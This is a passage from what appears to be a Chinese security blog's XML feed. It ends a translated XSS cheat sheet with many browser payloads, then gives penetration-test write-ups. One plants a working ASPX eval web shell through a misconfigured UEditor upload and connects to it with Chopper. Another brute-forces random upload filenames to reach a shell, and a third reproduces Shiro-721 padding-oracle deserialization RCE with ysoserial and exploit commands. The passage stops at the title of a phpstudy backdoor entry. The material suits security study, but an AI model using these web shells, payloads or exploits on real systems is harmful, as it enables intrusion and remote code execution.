class="hljs-string">&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#x27;&gt;</span></code></pre><p>多语言有效载荷2</p><pre><code class="hljs xml">javascript:&quot;/*&#x27;/*`/*--&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">noscript</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">noembed</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> \&quot;</span><span class="hljs-tag"> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">/*&amp;lt;svg/*/onload</span>=<span class="hljs-string">alert()//</span>&gt;</span></code></pre><h3 id="经典向量（XSS加密）"><a href="#经典向量（XSS加密）" class="headerlink" title="经典向量（XSS加密）"></a>经典向量（XSS加密）</h3><p>具有JavaScript协议的Image src</p><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</code></pre><p>带有JavaScript协议的正文背景</p><pre><code class="hljs routeros">&lt;body <span class="hljs-attribute">background</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</code></pre><p>随着现代浏览器使用空来源，iframe数据网址不再起作用</p><pre><code class="hljs nix">&lt;iframe <span class="hljs-attr">src=&quot;data:text/html,&lt;img</span> <span class="hljs-attr">src=1</span> <span class="hljs-attr">onerror=alert(document.domain)&gt;&quot;&gt;</span></code></pre><p>用于IE的VBScript协议</p><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;vbscript:MsgBox+1&quot;</span>&gt;XSS&lt;/a&gt;&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;vbs:Msgbox+1&quot;</span>&gt;XSS&lt;/a&gt;&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;VBS:Msgbox+1&quot;</span>&gt;XSS&lt;/a&gt;&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;vbscript:Msgbox+1&quot;</span>&gt;XSS&lt;/a&gt;&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;VBSCRIPT:Msgbox+1&quot;</span>&gt;XSS&lt;/a&gt;&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">language</span>=vbs <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;vbscript:Msgbox+1&quot;</span>&gt;XSS&lt;/a&gt;</code></pre><p>JScript compact是JS的最小版本，未在IE中广泛使用</p><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;jscript.compact:alert(1);&quot;</span>&gt;test&lt;/a&gt;&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;JSCRIPT.COMPACT:alert(1);&quot;</span>&gt;test&lt;/a&gt;</code></pre><p>JScript.Encode允许编码的JavaScript</p><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=# <span class="hljs-attribute">language</span>=<span class="hljs-string">&quot;JScript.Encode&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@&quot;</span>&gt;XSS&lt;/a&gt;&lt;a <span class="hljs-attribute">href</span>=# <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@&quot;</span>&gt;XSS&lt;/a&gt;</code></pre><p>VBScript.Encoded允许编码的VBScript</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">VBScript.Encode:#@~^CAAAAA</span>==<span class="hljs-string">\ko$K6,FoQIAAA</span>==<span class="hljs-string">^#~@</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">language</span>=<span class="hljs-string">VBScript.Encode</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">#@~^CAAAAA</span>==<span class="hljs-string">\ko$K6,FoQIAAA</span>==<span class="hljs-string">^#~@</span>&gt;</span></code></pre><p>用于Netscape Navigator的JavaScript实体</p><pre><code class="hljs dust"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;&amp;</span></span></span><span class="hljs-template-variable">&#123;alert(1)&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre><p>Netscape Navigator曾经支持JavaScript样式表</p><pre><code class="hljs routeros">&lt;link <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;xss.js&quot;</span> <span class="hljs-attribute">rel</span>=stylesheet <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</code></pre><p>用于消耗标记的按钮</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">name</span>=<span class="hljs-string">x</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>stealme</code></pre><p>IE9选择元素和纯文本用于消耗标记</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">name</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">plaintext</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">token=<span class="hljs-string">&quot;supersecret&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>仅限XBL Firefox &lt;= 2</p><pre><code class="hljs routeros">&lt;div <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)&quot;</span>&gt;&lt;div <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;\-\mo\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)&quot;</span>&gt;&lt;div <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;-moz-bindin\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)&quot;</span>&gt;&lt;div <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;-moz-bindin&amp;#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)&quot;</span>&gt;</code></pre><p>XBL也使用数据URL在FF3.5中工作</p><pre><code class="hljs perl">&lt;img src=<span class="hljs-string">&quot;blah&quot;</span> style=<span class="hljs-string">&quot;-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)&quot;</span> /&gt;</code></pre><p>CSS表达式&lt;= IE7</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">xss:expression(alert(1))</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">xss:expression(1)-alert(1)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">xss:expressio\6e(alert(1))</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">xss:expressio\006e(alert(1))</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">xss:expressio\00006e(alert(1))</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">xss:expressio\6e(alert(1))</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">xss:expressio&amp;#x5c;6e(alert(1))</span>&gt;</span></code></pre><p>在怪癖模式下，IE允许您使用=代替：</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">xss</span>=<span class="hljs-string">expression(alert(1))</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color&amp;#x3dred&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre><p>IE较旧模式的行为</p><pre><code class="hljs livecodeserver">&lt;<span class="hljs-keyword">a</span> style=<span class="hljs-string">&quot;behavior:url(#default#AnchorClick);&quot;</span> <span class="hljs-built_in">folder</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;XSS&lt;/<span class="hljs-keyword">a</span>&gt;</code></pre><p>IE中较旧版本的函数中支持的事件处理程序</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">window</span>.<span class="hljs-title">onload</span>(<span class="hljs-params"></span>)</span>&#123;</span>alert(1);&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">window</span>::<span class="hljs-title">onload</span>(<span class="hljs-params"></span>)</span>&#123;</span>alert(1);&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">window</span>.<span class="hljs-title">location</span>(<span class="hljs-params"></span>)</span>&#123;</span>&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span>/*&lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=1 <span class="hljs-title">onerror</span>=<span class="hljs-title">alert</span>(<span class="hljs-params"><span class="hljs-number">1</span></span>)&gt;*/<span class="hljs-title">document</span>.<span class="hljs-title">body</span>.<span class="hljs-title">innerHTML</span>(<span class="hljs-params"></span>)</span>&#123;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">document</span>.<span class="hljs-title">body</span>.<span class="hljs-title">innerHTML</span>(<span class="hljs-params"></span>)</span>&#123; x = <span class="hljs-string">&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</span>; &#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></code></pre><p>GreyMagic HTML + time漏洞利用（即使在5 docmode下也不再起作用）</p><pre><code class="hljs vim"><span class="hljs-symbol">&lt;HTML&gt;</span><span class="hljs-symbol">&lt;BODY&gt;</span>&lt;?<span class="hljs-keyword">xm</span><span class="hljs-variable">l:namespace</span> prefix=<span class="hljs-string">&quot;t&quot;</span> ns=<span class="hljs-string">&quot;urn:schemas-microsoft-com:time&quot;</span>&gt;&lt;?import namespace=<span class="hljs-string">&quot;t&quot;</span> implementation=<span class="hljs-string">&quot;#default#time2&quot;</span>&gt;&lt;<span class="hljs-variable">t:set</span> attributeName=<span class="hljs-string">&quot;innerHTML&quot;</span> <span class="hljs-keyword">to</span>=<span class="hljs-string">&quot;XSS&lt;img src=1 onerror=alert(1)&gt;&quot;</span>&gt; &lt;/BODY&gt;&lt;/HTML&gt;</code></pre><hr><blockquote><p>原文地址：<a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>佛学的魔改.net Ueditor</title>
    <link href="/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9.net%20Ueditor.html"/>
    <url>/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9.net%20Ueditor.html</url>
    
    <content type="html"><![CDATA[<p> 前几天在驻场时候遇到一个套娃的站，一个站里面套了N多个站，域名相同，根据不同的子目录进行区分，由于现在已经修复了，只能尽量还原当时的场景来写这文章。</p><p>网站上传点对上传的文件进行了二次渲染，此处无法绕过，只能寻找其他突破口（因为套了不少站，浪费大量时间）。</p><p>翻功能的时候，在一个站点找到这么一个编辑器，是不是很眼熟。</p><p>![20191211_佛学的魔改.net Ueditor](/images/20191211_佛学的魔改.net Ueditor/01.jpg)</p><a id="more"></a><p>通过fd抓包获取到编辑器路径为：</p><p><code>https://xxx.xxx.com.cn/crm9000/HtmlControl/ueditor1.4.3.3/</code></p><p>果断用exp去打，结果访问漏洞地址的时候，发现404。</p><p>![20191211_佛学的魔改.net Ueditor](/images/20191211_佛学的魔改.net Ueditor/02.jpg)</p><p>查看上传功能，发现上传功能也无法正常使用，提示后端配置项无法正常加载。</p><p>![20191211_佛学的魔改.net Ueditor](/images/20191211_佛学的魔改.net Ueditor/03.jpg)</p><p>查看配置文件，感觉也没有问题呀，此时有点郁闷。</p><p>![20191211_佛学的魔改.net Ueditor](/images/20191211_佛学的魔改.net Ueditor/04.jpg)</p><p>在牧马大佬的提示下，仔细查看js和流量。首先查看js，发现此处加载了一个Add.js文件。</p><p>![20191211_佛学的魔改.net Ueditor](/images/20191211_佛学的魔改.net Ueditor/05.jpg)</p><p>打开这个js文件，找到了ueditor的真实路径。</p><p>![20191211_佛学的魔改.net Ueditor](/images/20191211_佛学的魔改.net Ueditor/06.jpg)</p><p>但是去访问的时候，发现地址无法访问。</p><p>![20191211_佛学的魔改.net Ueditor](/images/20191211_佛学的魔改.net Ueditor/07.jpg)</p><p>通过查看加载编辑器时的网络包，可以看到这也是后端配置项无法正常加载的原因。</p><p>![20191211_佛学的魔改.net Ueditor](/images/20191211_佛学的魔改.net Ueditor/08.jpg)</p><p>然后尝试直接拼接编辑器路径到域名上，发现访问成功，原来是开发配置得有问题，多加了端口。</p><p>![20191211_佛学的魔改.net Ueditor](/images/20191211_佛学的魔改.net Ueditor/09.jpg)</p><p>既然能够正常访问，那我就不客气了，拿exp干他，先在服务器上丢个aa.jpg的一句话马。</p><p>![20191211_佛学的魔改.net Ueditor](/images/20191211_佛学的魔改.net Ueditor/10.jpg)</p><p>上传成功，返回的路径为：<code>upload/image/201912/11/6371165485276351045218627.aspx</code>（记住这个该死的路径，等下要懵逼。）</p><p>![20191211_佛学的魔改.net Ueditor](/images/20191211_佛学的魔改.net Ueditor/11.jpg)</p><p>接下来就是寻找路径了，我tm找了半个多小时呀，拼接了各种路径，都没找到。。。</p><p>后来实在无奈，继续去查看配置文件，看到配置文件的时候，人是懵逼的，路径是对的呀，但感觉总有哪里不对劲。</p><p>![20191211_佛学的魔改.net Ueditor](/images/20191211_佛学的魔改.net Ueditor/12.jpg)</p><p>然后不信这个邪，又重新上传了一次，发现此时返回的路径是</p><p><code>upload/image/20191211/6371165520599596974371346.aspx</code></p><p>![20191211_佛学的魔改.net Ueditor](/images/20191211_佛学的魔改.net Ueditor/13.jpg)</p><p>仔细一看，我tm，第一次返回的路径中那个’/‘哪来的，感情是给我返回了一个假路径给我，我就说配置文件看着哪里不对劲，原来是路径规则。</p><p>![20191211_佛学的魔改.net Ueditor](/images/20191211_佛学的魔改.net Ueditor/14.jpg)</p><p>但是访问shell的时候，报了一个错，第一次遇到这种问题。</p><p>![20191211_佛学的魔改.net Ueditor](/images/20191211_佛学的魔改.net Ueditor/15.jpg)</p><p>直接在aa.jpg里面加上<code>&lt;head runat=&quot;server&quot; /&gt;</code>，再上传，浏览器访问的时候就正常了，但是菜刀连接的时候，又报了这一堆东西（同事复现的时候，菜刀直接连接成功，佛学）。</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/default/default.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/EnStyle.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/Style.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></code></pre><p>继续把这些加到aa.jpg内容里，最后，aa.jpg内容为：</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/default/default.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/EnStyle.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/Style.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;g&quot;],&quot;unsafe&quot;);%&gt;</code></pre><p>上传成功后，菜刀连接成功。</p><p>![20191211_佛学的魔改.net Ueditor](/images/20191211_佛学的魔改.net Ueditor/16.jpg)</p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次任意文件上传</title>
    <link href="/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html"/>
    <url>/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html</url>
    
    <content type="html"><![CDATA[<p>很久没发文章了，一个是因为忙，另一个就是不知道发什么，这次遇到一个上传觉得挺有意思的，就分享一下思路。<br>在客户现场驻场遇到的站点，我们乙方在挖洞的同时，甲方也有十多个人在同步挖洞。我们少挖到洞还要找我们麻烦，欲哭无泪，太难了。<br>当时通过另外一个漏洞getshell，还在暗自高兴的时候，翻目录的时候，看到一个TempFile的目录下有个名为shell.aspx的文件，文件上传时间在目标给我们的前几个小时（客户在给我们目标前，就让甲方的渗透人员先测试了），此时的我笑容逐渐消失，意识到问题的严重性。</p><a id="more"></a><p>看到TempFile的目录，猜测是通过上传功能上传上来的。然后在后台找了许久，还好功能不多，找到了上传的功能点（之前这个功能点因为浏览器不兼容的原因，无法使用，后来使用ie才能够正常使用）。</p><p>上传点在一个上传附件的地方，上传图片，拦截到此数据包发送到repeater模块。<br><img src="/images/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png" alt="20191127记一次任意文件上传"><br>修改数据包，可以发现上传成功，但是并不知道真实路径，文件的访问路径为：<a href="http://xxx.com:port/File/DownLoadFile/22c84d83-d9cf-dd7b-0dd1-ea72ddddd18b">http://xxx.com:port/File/DownLoadFile/22c84d83-d9cf-dd7b-0dd1-ea72ddddd18b</a>。<br><img src="/images/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png" alt="20191127记一次任意文件上传"><br>经过长时间的测试，uploadUserNo参数中加上//会导致报错，可以看到文件真实路径(getshell后发现uploadUserNo参数的值会和文件名进行拼接，例如：uploadUserNo参数值为dd//时，文件名为：dd//_年月日时分秒四位随机数_上传文件名，因为文件名不允许有//等特殊字符，所以会报错)。<br>此时知道文件目录为TempFile，文件名随机重命名，能够看到其命名规则为【_年月日时分秒四位随机数_上传文件名】<br><img src="/images/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png" alt="20191127记一次任意文件上传"><br>与电脑时间同步上传，可能秒数会有偏差，假设为偏差间隔为3秒，加上四位随机数字。<br>重新上传一次文件，记录上传时间为：“2019年11月27日16时19分11秒”。然后构造数据包进行爆破。<br><img src="/images/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/4.png" alt="20191127记一次任意文件上传"><br>设置第一个标志位<br><img src="/images/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/5.png" alt="20191127记一次任意文件上传"><br>设置第二个标志位加载生成的0000-9999的4位数字典<br><img src="/images/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/6.png" alt="20191127记一次任意文件上传"><br>经过一段时间后爆破成功。<br><img src="/images/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/7.png" alt="20191127记一次任意文件上传"><br>访问会报错，但问题不大，拿shell客户端直接连接<br><img src="/images/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/8.png" alt="20191127记一次任意文件上传"><br>Getshell成功<br><img src="/images/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/9.png" alt="20191127记一次任意文件上传"></p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SHIRO-721 RememberMe Padding Oracle Vulnerability RCE</title>
    <link href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/SHIRO-721-RememberMe-Padding-Oracle-Vulnerability-RCE.html"/>
    <url>/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/SHIRO-721-RememberMe-Padding-Oracle-Vulnerability-RCE.html</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p><code>shiro是一个java场景使用较多组件，最近曝出因使用了 AES-128-CBC 模式对cookie进行加密，so可以padding oracle攻击构造数据进行反序列化攻击</code></p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><p><code>影响版本： shiro&lt;1.4.1</code></p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><p>git clone <a href="https://github.com/3ndz/Shiro-721.git">https://github.com/3ndz/Shiro-721.git</a><br>cd Shiro-721/Docker<br>docker build -t shiro-721 .<br>docker run -p 8080:8080 -d shiro-721</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p><strong>攻击流程：</strong></p><ol><li>登录网站（勾选Remember），并从Cookie中获取合法的RememberMe。</li><li>使用RememberMe cookie作为Padding Oracle Attack的前缀。</li><li>加密 ysoserial 的序列化 payload，以通过Padding Oracle Attack制作恶意RememberMe。</li><li>重放恶意RememberMe cookie，以执行反序列化攻击。<a id="more"></a>1、此漏洞需要帐号密码，登录后，取cookie的rememberMe值</li></ol><p>![SHIRO-721 RememberMe Padding Oracle Vulnerability RCE](/images/20191128_SHIRO-721 RememberMe Padding Oracle Vulnerability RCE/01.jpg)</p><p>2、生成payload.class</p><p><code>java -jar ysoserial.jar CommonsCollections1 &quot;ping dnslog.cn&quot; &gt; payload.class</code></p><p>3、生成恶意rememberMe值</p><p>需输入3个参数，目标url，正常rememberMe值，payload.class，跑脚本会需要点时间。</p><p><code>python2 shiro_exp.py http://192.168.52.130:8080/ rememberMe值 payload.class</code></p><p>![SHIRO-721 RememberMe Padding Oracle Vulnerability RCE](/images/20191128_SHIRO-721 RememberMe Padding Oracle Vulnerability RCE/02.jpg)</p><p>4、使用生成的恶意remeberMe值进行访问</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>shiro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpstudy后门利用方法及getshell</title>
    <link href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/phpstudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%8Agetshell.html"/>
    <url>/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/phpstudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%8Agetshell.html</url>
    
